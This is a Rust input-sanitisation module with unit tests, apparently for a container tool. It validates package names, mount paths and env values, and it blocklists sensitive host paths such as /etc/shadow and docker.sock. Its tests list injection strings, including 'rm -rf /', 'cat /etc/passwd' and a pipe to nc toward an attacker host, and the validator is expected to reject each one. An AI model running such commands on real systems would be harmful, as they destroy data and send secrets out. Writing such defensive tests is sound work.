use regex::Regex;
use once_cell::sync::Lazy;

use crate::error::{OutClawError, Result};

/// Regex for valid Debian package names: starts with alphanumeric, then alphanumeric, dots, plus, hyphens
static APT_PACKAGE_RE: Lazy<Regex> =
    Lazy::new(|| Regex::new(r"^[a-zA-Z0-9][a-zA-Z0-9.+\-]*$").unwrap());

/// Regex for npm-style package names (including scoped packages)
static EXTENSION_RE: Lazy<Regex> =
    Lazy::new(|| Regex::new(r"^(@[a-z0-9\-~][a-z0-9\-._~]*/)?[a-z0-9\-~][a-z0-9\-._~]*$").unwrap());

/// Regex for Docker named volumes
static NAMED_VOLUME_RE: Lazy<Regex> =
    Lazy::new(|| Regex::new(r"^[a-zA-Z0-9][a-zA-Z0-9_.\-]*$").unwrap());

/// Regex for valid instance names: alphanumeric, spaces, hyphens, underscores
static INSTANCE_NAME_RE: Lazy<Regex> =
    Lazy::new(|| Regex::new(r"^[a-zA-Z0-9][a-zA-Z0-9 \-_]*$").unwrap());

/// Shell metacharacters that should never appear in environment variable values
const SHELL_METACHARACTERS: &[char] = &[';', '|', '&', '$', '`', '(', ')', '{', '}', '<', '>'];

/// Sensitive host paths that should never be mounted
const SENSITIVE_PATHS: &[&str] = &[
    "/etc/shadow",
    "/etc/passwd",
    "/etc/sudoers",
    "/root/.ssh",
    "/var/run/docker.sock",
    "/proc",
    "/sys",
    "/dev",
    "/boot",
    "/etc/ssl/private",
];

/// Allowed mount options
const ALLOWED_MOUNT_OPTS: &[&str] = &["ro", "rw", "z", "Z", "cached", "delegated", "consistent"];

/// Sanitize and validate apt package names.
/// Each space-separated token must be a valid Debian package name.
pub fn sanitize_apt_packages(input: &str) -> Result<String> {
    let trimmed = input.trim();
    if trimmed.is_empty() {
        return Ok(String::new());
    }

    let tokens: Vec<&str> = trimmed.split_whitespace().collect();
    for token in &tokens {
        if !APT_PACKAGE_RE.is_match(token) {
            return Err(OutClawError::InputValidation(format!(
                "Invalid apt package name: '{}'. Only alphanumeric characters, dots, plus signs, and hyphens are allowed.",
                token
            )));
        }
        if token.len() > 128 {
            return Err(OutClawError::InputValidation(format!(
                "Apt package name too long: '{}' (max 128 characters)",
                token
            )));
        }
    }

    Ok(tokens.join(" "))
}

/// Sanitize and validate extension identifiers.
/// Each space-separated token must be a valid npm-style package name.
pub fn sanitize_extensions(input: &str) -> Result<String> {
    let trimmed = input.trim();
    if trimmed.is_empty() {
        return Ok(String::new());
    }

    let tokens: Vec<&str> = trimmed.split_whitespace().collect();
    for token in &tokens {
        if !EXTENSION_RE.is_match(token) {
            return Err(OutClawError::InputValidation(format!(
                "Invalid extension name: '{}'. Must be a valid npm package name (e.g., '@scope/package-name').",
                token
            )));
        }
        if token.len() > 214 {
            return Err(OutClawError::InputValidation(format!(
                "Extension name too long: '{}' (max 214 characters)",
                token
            )));
        }
    }

    Ok(tokens.join(" "))
}

/// Sanitize and validate a home volume specification.
/// Must be either a Docker named volume or a safe absolute host path.
pub fn sanitize_home_volume(input: &str) -> Result<String> {
    let trimmed = input.trim();
    if trimmed.is_empty() {
        return Ok(String::new());
    }

    // Check if it's a Docker named volume
    if NAMED_VOLUME_RE.is_match(trimmed) {
        return Ok(trimmed.to_string());
    }

    // Otherwise, validate as an absolute path
    validate_host_path(trimmed)?;

    Ok(trimmed.to_string())
}

/// Sanitize and validate extra mount specifications.
/// Format: comma-separated `source:target[:options]` entries.
pub fn sanitize_extra_mounts(input: &str) -> Result<String> {
    let trimmed = input.trim();
    if trimmed.is_empty() {
        return Ok(String::new());
    }

    let mounts: Vec<&str> = trimmed.split(',').map(|s| s.trim()).collect();
    let mut validated = Vec::new();

    for mount in mounts {
        if mount.is_empty() {
            continue;
        }

        let parts: Vec<&str> = mount.split(':').collect();
        if parts.len() < 2 || parts.len() > 3 {
            return Err(OutClawError::InputValidation(format!(
                "Invalid mount specification: '{}'. Expected format: source:target[:options]",
                mount
            )));
        }

        let source = parts[0];
        let target = parts[1];

        // Validate source: named volume or host path
        if !NAMED_VOLUME_RE.is_match(source) {
            validate_host_path(source)?;
        }

        // Validate target: must be an absolute path
        if !target.starts_with('/') {
            return Err(OutClawError::InputValidation(format!(
                "Mount target must be an absolute path: '{}'",
                target
            )));
        }

        // Validate options if present
        if parts.len() == 3 {
            let opts: Vec<&str> = parts[2].split(',').collect();
            for opt in &opts {
                if !ALLOWED_MOUNT_OPTS.contains(opt) {
                    return Err(OutClawError::InputValidation(format!(
                        "Invalid mount option: '{}'. Allowed options: {}",
                        opt,
                        ALLOWED_MOUNT_OPTS.join(", ")
                    )));
                }
            }
        }

        validated.push(mount.to_string());
    }

    Ok(validated.join(","))
}

/// Sanitize a value that will be written to a .env file.
/// Rejects values containing newlines, null bytes, or other injection vectors.
pub fn sanitize_env_value(input: &str) -> Result<String> {
    if input.contains('\0') {
        return Err(OutClawError::InputValidation(
            "Environment variable value must not contain null bytes".to_string(),
        ));
    }

    if input.contains('\n') || input.contains('\r') {
        return Err(OutClawError::InputValidation(
            "Environment variable value must not contain newlines".to_string(),
        ));
    }

    Ok(input.to_string())
}

/// Sanitize and validate an instance name.
/// Allows alphanumeric characters, spaces, hyphens, and underscores. Max 64 chars.
pub fn sanitize_instance_name(input: &str) -> Result<String> {
    let trimmed = input.trim();
    if trimmed.is_empty() {
        return Ok(String::new());
    }

    if trimmed.len() > 64 {
        return Err(OutClawError::InputValidation(
            "Instance name must be at most 64 characters".to_string(),
        ));
    }

    if trimmed.len() < 2 {
        return Err(OutClawError::InputValidation(
            "Instance name must be at least 2 characters".to_string(),
        ));
    }

    if !INSTANCE_NAME_RE.is_match(trimmed) {
        return Err(OutClawError::InputValidation(
            "Instance name may only contain letters, numbers, spaces, hyphens, and underscores".to_string(),
        ));
    }

    Ok(trimmed.to_string())
}

/// Validate a host path for mount safety.
fn validate_host_path(path: &str) -> Result<()> {
    // Must be absolute
    if !path.starts_with('/') {
        return Err(OutClawError::InputValidation(format!(
            "Host path must be absolute: '{}'",
            path
        )));
    }

    // Reject null bytes
    if path.contains('\0') {
        return Err(OutClawError::InputValidation(
            "Path must not contain null bytes".to_string(),
        ));
    }

    // Reject path traversal
    if path.contains("..") {
        return Err(OutClawError::InputValidation(format!(
            "Path traversal (..) is not allowed: '{}'",
            path
        )));
    }

    // Reject shell metacharacters
    for ch in SHELL_METACHARACTERS {
        if path.contains(*ch) {
            return Err(OutClawError::InputValidation(format!(
                "Path contains forbidden character '{}': '{}'",
                ch, path
            )));
        }
    }

    // Check against sensitive path blocklist
    for sensitive in SENSITIVE_PATHS {
        if path == *sensitive || path.starts_with(&format!("{}/", sensitive)) {
            return Err(OutClawError::InputValidation(format!(
                "Mounting sensitive host path is not allowed: '{}'",
                path
            )));
        }
    }

    Ok(())
}

/// Sanitize settings fields before storing. Returns sanitized versions of all fields.
pub fn sanitize_instance_settings(
    name: &str,
    apt_packages: &str,
    extensions: &str,
    home_volume: &str,
    extra_mounts: &str,
) -> Result<(String, String, String, String, String)> {
    let name = if name.is_empty() {
        String::new()
    } else {
        sanitize_instance_name(name)?
    };
    let apt_packages = sanitize_apt_packages(apt_packages)?;
    let extensions = sanitize_extensions(extensions)?;
    let home_volume = sanitize_home_volume(home_volume)?;
    let extra_mounts = sanitize_extra_mounts(extra_mounts)?;

    Ok((name, apt_packages, extensions, home_volume, extra_mounts))
}

#[cfg(test)]
mod tests {
    use super::*;

    // --- apt_packages tests ---

    #[test]
    fn test_sanitize_apt_packages_valid() {
        assert_eq!(sanitize_apt_packages("vim curl git").unwrap(), "vim curl git");
        assert_eq!(sanitize_apt_packages("  vim  curl  ").unwrap(), "vim curl");
        assert_eq!(sanitize_apt_packages("").unwrap(), "");
        assert_eq!(sanitize_apt_packages("libssl-dev").unwrap(), "libssl-dev");
        assert_eq!(sanitize_apt_packages("g++").unwrap(), "g++");
    }

    #[test]
    fn test_sanitize_apt_packages_shell_injection() {
        assert!(sanitize_apt_packages("vim; rm -rf /").is_err());
        assert!(sanitize_apt_packages("vim && cat /etc/passwd").is_err());
        assert!(sanitize_apt_packages("vim | nc attacker 1234").is_err());
        assert!(sanitize_apt_packages("$(malicious)").is_err());
        assert!(sanitize_apt_packages("vim`whoami`").is_err());
    }

    #[test]
    fn test_sanitize_apt_packages_newline_injection() {
        assert!(sanitize_apt_packages("vim\nRUN malicious").is_err());
        assert!(sanitize_apt_packages("vim\rmalicious").is_err());
    }

    // --- extensions tests ---

    #[test]
    fn test_sanitize_extensions_valid() {
        assert_eq!(sanitize_extensions("@openclaw/ext-one").unwrap(), "@openclaw/ext-one");
        assert_eq!(sanitize_extensions("my-ext another-ext").unwrap(), "my-ext another-ext");
        assert_eq!(sanitize_extensions("").unwrap(), "");
    }

    #[test]
    fn test_sanitize_extensions_invalid() {
        assert!(sanitize_extensions("../../../etc/passwd").is_err());
        assert!(sanitize_extensions("UPPERCASE").is_err());
    }

    // --- home_volume tests ---

    #[test]
    fn test_sanitize_home_volume_valid() {
        assert_eq!(sanitize_home_volume("my-volume").unwrap(), "my-volume");
        assert_eq!(sanitize_home_volume("/home/user/data").unwrap(), "/home/user/data");
        assert_eq!(sanitize_home_volume("").unwrap(), "");
    }

    #[test]
    fn test_sanitize_home_volume_path_traversal() {
        assert!(sanitize_home_volume("/home/../etc/shadow").is_err());
        assert!(sanitize_home_volume("../secret").is_err());
    }

    #[test]
    fn test_sanitize_home_volume_sensitive_paths() {
        assert!(sanitize_home_volume("/var/run/docker.sock").is_err());
        assert!(sanitize_home_volume("/etc/shadow").is_err());
        assert!(sanitize_home_volume("/proc").is_err());
        assert!(sanitize_home_volume("/proc/1/mem").is_err());
    }

    // --- extra_mounts tests ---

    #[test]
    fn test_sanitize_extra_mounts_valid() {
        assert_eq!(
            sanitize_extra_mounts("/host/path:/container/path:ro").unwrap(),
            "/host/path:/container/path:ro"
        );
        assert_eq!(
            sanitize_extra_mounts("my-vol:/data").unwrap(),
            "my-vol:/data"
        );
        assert_eq!(sanitize_extra_mounts("").unwrap(), "");
    }

    #[test]
    fn test_sanitize_extra_mounts_invalid_format() {
        assert!(sanitize_extra_mounts("invalid").is_err());
        assert!(sanitize_extra_mounts("/a:/b:/c:/d").is_err());
    }

    #[test]
    fn test_sanitize_extra_mounts_invalid_options() {
        assert!(sanitize_extra_mounts("/a:/b:exec").is_err());
        assert!(sanitize_extra_mounts("/a:/b:suid").is_err());
    }

    #[test]
    fn test_sanitize_extra_mounts_sensitive_source() {
        assert!(sanitize_extra_mounts("/var/run/docker.sock:/docker.sock").is_err());
        assert!(sanitize_extra_mounts("/etc/shadow:/shadow").is_err());
    }

    #[test]
    fn test_sanitize_extra_mounts_relative_target() {
        assert!(sanitize_extra_mounts("/host:relative/path").is_err());
    }

    // --- env_value tests ---

    #[test]
    fn test_sanitize_env_value_valid() {
        assert_eq!(sanitize_env_value("normal value").unwrap(), "normal value");
        assert_eq!(sanitize_env_value("v0.42.1").unwrap(), "v0.42.1");
    }

    #[test]
    fn test_sanitize_env_value_newline_injection() {
        assert!(sanitize_env_value("value\nEXTRA_VAR=malicious").is_err());
        assert!(sanitize_env_value("value\rmalicious").is_err());
        assert!(sanitize_env_value("value\0null").is_err());
    }

    // --- instance_name tests ---

    #[test]
    fn test_sanitize_instance_name_valid() {
        assert_eq!(sanitize_instance_name("Cosmic Otter").unwrap(), "Cosmic Otter");
        assert_eq!(sanitize_instance_name("my-instance_01").unwrap(), "my-instance_01");
    }

    #[test]
    fn test_sanitize_instance_name_too_short() {
        assert!(sanitize_instance_name("a").is_err());
    }

    #[test]
    fn test_sanitize_instance_name_too_long() {
        let long_name = "a".repeat(65);
        assert!(sanitize_instance_name(&long_name).is_err());
    }

    #[test]
    fn test_sanitize_instance_name_invalid_chars() {
        assert!(sanitize_instance_name("name;injection").is_err());
        assert!(sanitize_instance_name("name<script>").is_err());
    }
}
